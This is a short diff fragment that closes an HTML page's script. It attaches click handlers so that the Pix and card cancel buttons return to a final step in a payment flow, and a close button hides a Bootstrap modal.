+      document.getElementById('cancelPix').addEventListener('click', () => showStep('flowFinal', 3));
+      document.getElementById('cancelCartao').addEventListener('click', () => showStep('flowFinal', 3));
+      document.getElementById('closeSuccess').addEventListener('click', () => bootstrapModal.hide());
+    });
+  </script>
+</body>
+</html>
